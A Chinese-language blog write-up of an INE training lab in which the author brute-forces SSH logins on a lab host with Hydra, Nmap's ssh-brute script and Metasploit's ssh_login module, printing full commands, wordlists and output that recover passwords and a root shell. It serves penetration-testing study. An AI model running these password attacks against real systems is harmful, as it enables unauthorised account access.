---
layout: post
title: "Bruteforce and Password cracking Live"
date: "2022-07-13"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Bruteforce and Password cracking Live（在线暴力破解和密码破解）
在本实验中，您将学习使用 Hydra、Nmap 脚本和 Metasploit 对 SSH 服务运行字典攻击。

## 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。可以使用安装在 Kali 上的工具访问 SSH 服务器，网址为 `http://demo.ine.local`

目标：执行以下活动：

1.使用Hydra查找用户“student”的密码。使用密码字典：`/usr/share/wordlists/rockyou.txt.gz`

2.使用合适的 Nmap 脚本找到用户“administrator”的密码。使用密码字典：`/usr/share/nmap/nselib/data/passwords.lst`

3.使用 `ssh_login` Metasploit 模块查找用户“root”的密码。使用用户密码字典：`/usr/share/wordlists/metasploit/root_userpass.txt`

## 工具
该实验室的最佳工具是：

* Metasploit Framework
* Hydra
* Nmap

## 我自己的解决思路
```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.61.118.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.61.118.3): icmp_seq=1 ttl=64 time=0.089 ms
64 bytes from demo.ine.local (192.61.118.3): icmp_seq=2 ttl=64 time=0.078 ms
64 bytes from demo.ine.local (192.61.118.3): icmp_seq=3 ttl=64 time=0.049 ms
64 bytes from demo.ine.local (192.61.118.3): icmp_seq=4 ttl=64 time=0.042 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3050ms
rtt min/avg/max/mdev = 0.042/0.064/0.089/0.019 ms
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
        RX packets 7580  bytes 619508 (604.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5093  bytes 2337774 (2.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.61.118.2  netmask 255.255.255.0  broadcast 192.61.118.255
        ether 02:42:c0:3d:76:02  txqueuelen 0  (Ethernet)
        RX packets 24  bytes 2032 (1.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6  bytes 476 (476.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 31064  bytes 22753666 (21.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 31064  bytes 22753666 (21.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

目标demo.ine.local只开放了ssh服务。

```
root@INE:~# nmap -p1-65535 demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 07:39 IST
Nmap scan report for demo.ine.local (192.61.118.3)
Host is up (0.0000090s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:3D:76:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

找到用户`student`的密码为`friend`。

```
hydra -l student -P /usr/share/wordlists/rockyou.txt.gz -f ssh://demo.ine.local -V

[22][ssh] host: demo.ine.local   login: student   password: friend
[STATUS] attack finished for demo.ine.local (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

该命令也可以这样写：

```
hydra demo.ine.local ssh -l student -P /usr/share/wordlists/rockyou.txt.gz -f -V

[22][ssh] host: demo.ine.local   login: student   password: friend
```

验证一下ssh凭证的有效性：

```
root@INE:~# ssh student@demo.ine.local
The authenticity of host 'demo.ine.local (192.61.118.3)' can't be established.
ED25519 key fingerprint is SHA256:usoU91o26EhXVfBuwZIwlQtdpEw/EHXRp7NejBKASWA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'demo.ine.local' (ED25519) to the list of known hosts.
Ubuntu 16.04.5 LTS
student@demo.ine.local's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SSH recon dictionary attack lab

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@demo:~$ whoami
student
student@demo:~$ pwd
/home/student
```

列出所有针对暴力破解的nse脚本：

```
root@INE:~# locate *.nse | grep brute
/usr/share/nmap/scripts/afp-brute.nse
/usr/share/nmap/scripts/ajp-brute.nse
/usr/share/nmap/scripts/backorifice-brute.nse
/usr/share/nmap/scripts/cassandra-brute.nse
/usr/share/nmap/scripts/cics-user-brute.nse
/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/cvs-brute-repository.nse
/usr/share/nmap/scripts/cvs-brute.nse
/usr/share/nmap/scripts/deluge-rpc-brute.nse
/usr/share/nmap/scripts/dicom-brute.nse
/usr/share/nmap/scripts/dns-brute.nse
/usr/share/nmap/scripts/domcon-brute.nse
/usr/share/nmap/scripts/dpap-brute.nse
/usr/share/nmap/scripts/drda-brute.nse
/usr/share/nmap/scripts/ftp-brute.nse
/usr/share/nmap/scripts/http-brute.nse
/usr/share/nmap/scripts/http-form-brute.nse
/usr/share/nmap/scripts/http-iis-short-name-brute.nse
/usr/share/nmap/scripts/http-joomla-brute.nse
/usr/share/nmap/scripts/http-proxy-brute.nse
/usr/share/nmap/scripts/http-wordpress-brute.nse
/usr/share/nmap/scripts/iax2-brute.nse
/usr/share/nmap/scripts/imap-brute.nse
/usr/share/nmap/scripts/informix-brute.nse
/usr/share/nmap/scripts/ipmi-brute.nse
/usr/share/nmap/scripts/irc-brute.nse
/usr/share/nmap/scripts/irc-sasl-brute.nse
/usr/share/nmap/scripts/iscsi-brute.nse
/usr/share/nmap/scripts/ldap-brute.nse
/usr/share/nmap/scripts/membase-brute.nse
/usr/share/nmap/scripts/metasploit-msgrpc-brute.nse
/usr/share/nmap/scripts/metasploit-xmlrpc-brute.nse
/usr/share/nmap/scripts/mikrotik-routeros-brute.nse
/usr/share/nmap/scripts/mmouse-brute.nse
/usr/share/nmap/scripts/mongodb-brute.nse
/usr/share/nmap/scripts/ms-sql-brute.nse
/usr/share/nmap/scripts/mysql-brute.nse
/usr/share/nmap/scripts/nessus-brute.nse
/usr/share/nmap/scripts/nessus-xmlrpc-brute.nse
/usr/share/nmap/scripts/netbus-brute.nse
/usr/share/nmap/scripts/nexpose-brute.nse
/usr/share/nmap/scripts/nje-node-brute.nse
/usr/share/nmap/scripts/nje-pass-brute.nse
/usr/share/nmap/scripts/nping-brute.nse
/usr/share/nmap/scripts/omp2-brute.nse
/usr/share/nmap/scripts/openvas-otp-brute.nse
/usr/share/nmap/scripts/oracle-brute-stealth.nse
/usr/share/nmap/scripts/oracle-brute.nse
/usr/share/nmap/scripts/oracle-sid-brute.nse
/usr/share/nmap/scripts/pcanywhere-brute.nse
/usr/share/nmap/scripts/pgsql-brute.nse
/usr/share/nmap/scripts/pop3-brute.nse
/usr/share/nmap/scripts/redis-brute.nse
/usr/share/nmap/scripts/rexec-brute.nse
/usr/share/nmap/scripts/rlogin-brute.nse
/usr/share/nmap/scripts/rpcap-brute.nse
/usr/share/nmap/scripts/rsync-brute.nse
/usr/share/nmap/scripts/rtsp-url-brute.nse
/usr/share/nmap/scripts/sip-brute.nse
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smtp-brute.nse
/usr/share/nmap/scripts/snmp-brute.nse
/usr/share/nmap/scripts/socks-brute.nse
/usr/share/nmap/scripts/ssh-brute.nse
/usr/share/nmap/scripts/svn-brute.nse
/usr/share/nmap/scripts/telnet-brute.nse
/usr/share/nmap/scripts/tso-brute.nse
/usr/share/nmap/scripts/vmauthd-brute.nse
/usr/share/nmap/scripts/vnc-brute.nse
/usr/share/nmap/scripts/xmpp-brute.nse
```


在usernames.lst中，有administrator用户。

```
root@INE:~# locate usernames.lst
/usr/share/nmap/nselib/data/usernames.lst
root@INE:~# cat /usr/share/nmap/nselib/data/usernames.lst
root
admin
administrator
webadmin
sysadmin
netadmin
guest
user
web
test

root@INE:~# locate passwords.lst
/usr/share/nmap/nselib/data/passwords.lst
```

为了减少暴力破解的次数，创建一个只包含administrator用户的admin.txt文件，使用`ssh-brute.nse`进行破解。

```
nmap -p 22 --script ssh-brute.nse --script-args userdb=/root/admin.txt,passdb=/usr/share/nmap/nselib/data/passwords.lst demo.ine.local
```

```
root@INE:~# nmap -p 22 --script ssh-brute.nse --script-args userdb=/root/admin.txt,passdb=/usr/share/nmap/nselib/data/passwords.lst demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 08:41 IST
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
Nmap scan report for demo.ine.local (192.61.118.3)
Host is up (0.000046s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 27 guesses in 8 seconds, average tps: 3.4
MAC Address: 02:42:C0:3D:76:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

找到有效凭据`administrator:sunshine`。

```
root@INE:~# ssh administrator@demo.ine.local
Ubuntu 16.04.5 LTS
administrator@demo.ine.local's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SSH recon dictionary attack lab

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

administrator@demo:~$ whoami
administrator
administrator@demo:~$ pwd
/home/administrator
```

[SCANNER SSH AUXILIARY MODULES](https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/)

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.61.118.3:22 - Starting bruteforce
[+] 192.61.118.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux demo.ine.local 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.61.118.2:41353 -> 192.61.118.3:22 ) at 2022-07-13 09:29:29 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

得到`root:attack`凭证，验证该凭证：

```
root@INE:~# ssh root@demo.ine.local
Ubuntu 16.04.5 LTS
root@demo.ine.local's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
SSH recon dictionary attack lab
root@demo:~# whoami  
root
root@demo:~# pwd
/root
root@demo:~# uname -a
Linux demo.ine.local 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
root@demo:~# python
Python 2.7.12 (default, Nov 12 2018, 14:36:49) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> quit()
```

## 解决方案

解决方案
第 1 步：打开实验室链接以访问 Kali GUI 实例。

第 2 步：检查提供的机器/域是否可访问。

**命令**

```
ping demo.ine.local
```

```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.141.16.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.141.16.3): icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from demo.ine.local (192.141.16.3): icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from demo.ine.local (192.141.16.3): icmp_seq=3 ttl=64 time=0.061 ms
64 bytes from demo.ine.local (192.141.16.3): icmp_seq=4 ttl=64 time=0.052 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3061ms
rtt min/avg/max/mdev = 0.052/0.064/0.086/0.013 ms
```

提供的机器是可达的，我们也找到了目标IP地址。

第 3 步：检查提供的机器上的开放端口。

**命令**

```
nmap -sV -sS demo.ine.local
```

```
root@INE:~# nmap -sV -sS demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 18:16 IST
Nmap scan report for demo.ine.local (192.141.16.3)
Host is up (0.0000090s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:8D:10:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

`-sV`：探测开放端口以确定服务/版本信息。

`-sS`：扫描技术

在提供的机器上，SSH 使用 OpenSSH 7.2p2 软件在端口 22 上运行。

第 4 步：检查 Kali 机器上存在的接口。

**命令**

```
ifconfig
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.6  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:06  txqueuelen 0  (Ethernet)
        RX packets 10666  bytes 845267 (825.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8264  bytes 2754651 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.141.16.2  netmask 255.255.255.0  broadcast 192.141.16.255
        ether 02:42:c0:8d:10:02  txqueuelen 0  (Ethernet)
        RX packets 1029  bytes 56327 (55.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1014  bytes 58952 (57.5 KiB)                                                                                                                                             
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                                          
                                                                                                                                                                                            
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                                                                                                                
        inet 127.0.0.1  netmask 255.0.0.0                                                                                                                                                   
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 35805  bytes 40053576 (38.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35805  bytes 40053576 (38.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

机器上有两个接口（不包括环回接口），即eth0和eth1。

### 使用Hydra
第 5 步：使用 Hydra 对“student”用户的 SSH 服务发起字典攻击。


**Hydra**


* 多线程身份验证暴力破解工具
* 支持多种协议，包括 FTP、HTTP、IMAP、IRC、LDAP、SSH、VNC 等。
* 用 C 写的

Hydra 帮助选项

```
hydra -h
```

我们将为此使用 wordlist `/usr/share/wordlists/rockyou.txt.gz`。解压缩存档。

**命令**

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```
root@INE:~# gzip -d /usr/share/wordlists/rockyou.txt.gz
root@INE:~# ls /usr/share/wordlists/
dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  seclists  wfuzz
```

现在，使用 Hydra 工具发起攻击。

**命令**

```
hydra -l student -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh -f
```

`-l`：使用单个用户名登录
`-P`：从列表中加载多个密码

```
root@INE:~# hydra -l student -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh -f
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-13 18:29:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://demo.ine.local:22/
[STATUS] 184.00 tries/min, 184 tries in 00:01h, 14344223 to do in 1299:18h, 16 active
[22][ssh] host: demo.ine.local   login: student   password: friend
[STATUS] attack finished for demo.ine.local (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-13 18:31:15
```

student用户的密码是friend。

### 使用 Nmap 脚本
第 6 步：我们将运行 `ssh-brute` Nmap 脚本来查找“administrator”用户的密码。

要使用的密码列表

```
 /usr/share/nmap/nselib/data/passwords.lst
```

ssh 暴力脚本`ssh-brute.nse` 是一个 Nmap 脚本，用于对 SSH 服务发起字典攻击。

该脚本采用用户名和密码列表文件。当攻击者不知道目标用户名时，这很有用。但是，在这种情况下，我们已经知道用户名，即“administrator”。因此，我们将创建一个仅包含此用户名的新文件。

**命令**

```
echo "administrator" > users
cat users
```

密码列表是`/usr/share/nmap/nselib/data/passwords.lst`。

我们现在可以运行脚本，

**命令**

```
nmap -p 22 --script ssh-brute --script-args userdb=/root/users demo.ine.local
```

```
root@INE:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/users demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 18:39 IST
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NS**E: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
Nmap scan report for demo.ine.local (192.141.16.3)
Host is up (0.000064s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 27 guesses in 6 seconds, average tps: 4.5
MAC Address: 02:42:C0:8D:10:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
```

“administrator”用户的密码是sunshine

### 使用 Metasloit
第七步：我们可以使用`auxiliary/scanner/ssh/ssh_login` Metasploit 框架的辅助模块来找到“root”用户的有效密码。

**ssh_login 模块**

它是 Metasploit 中 ssh 服务的辅助扫描器模块。它还会在成功时弹出一个 SSH shell。

`-q`：使用选项以安静模式启动 msfconsole

**命令**

```
msfconsole -q
```

使用`auxiliary/scanner/ssh/ssh_login`模块并设置所有必需的目标详细信息，即 RHOSTS、USERPASS_FILE、STOP_ON_SUCCESS、verbose等。

**密码列表**

```
/usr/share/wordlists/metasploit/root_userpass.txt
```

```
root@INE:~# cat /usr/share/wordlists/metasploit/root_userpass.txt
root
root !root
root Cisco
root NeXT
root QNX
root admin
root attack
root ax400
root bagabu
root blablabla
root blender
root brightmail
root calvin
root changeme
root changethis
root default
root fibranne
root honey
root jstwo
root kn1TG7psLu
root letacla
root mpegvideo
root nsi
root par0t
root pass
root password
root pixmet2003
```

**命令**

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
```
`RHOSTS`: 目标IP地址。

`USERPASS_FILE`: 自定义用户名和密码文件，即 `user:pass`

`STOP_ON_SUCCESS`: 如果设置为 `true`，则操作会在找到工作凭据后停止

`verbose`: 如果设置为 `true`，操作日志将显示在控制台上

```
root@INE:~# msfconsole -q
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

[*] 192.141.16.3:22 - Starting bruteforce
[-] 192.141.16.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.141.16.3:22 - Failed: 'root:!root'
[-] 192.141.16.3:22 - Failed: 'root:Cisco'
[-] 192.141.16.3:22 - Failed: 'root:NeXT'
[-] 192.141.16.3:22 - Failed: 'root:QNX'
[-] 192.141.16.3:22 - Failed: 'root:admin'
[+] 192.141.16.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux demo.ine.local 5.4.0-121-generic #137-Ubuntu SMP Wed Jun 15 13:33:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.141.16.2:38193 -> 192.141.16.3:22 ) at 2022-07-13 19:01:15 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

“root”用户的密码是attack。这些工具还提供了一个 SSH shell。

**命令**

```
sessions
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   192.141.16.2:38193 -> 192.141.16.3:22  (192.141.16.3)
```

与 Hydra 和 Nmap 相比，Metasploit 框架需要更多时间进行字典攻击。

我们可以使用凭据通过 SSH 命令访问目标机器。

第 8 步：使用用户“root”的凭据通过 SSH 连接到目标机器。

**命令**

```
ssh root@demo.ine.local
```

```
<yes>
<attack>
id
```

```
root@INE:~# ssh root@demo.ine.local
The authenticity of host 'demo.ine.local (192.141.16.3)' can't be established.
ED25519 key fingerprint is SHA256:usoU91o26EhXVfBuwZIwlQtdpEw/EHXRp7NejBKASWA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'demo.ine.local' (ED25519) to the list of known hosts.
Ubuntu 16.04.5 LTS
root@demo.ine.local's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
SSH recon dictionary attack lab
root@demo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

这就是我们可以使用 Hydra、Nmap 和 Metasploit 对服务发起字典攻击的方式。
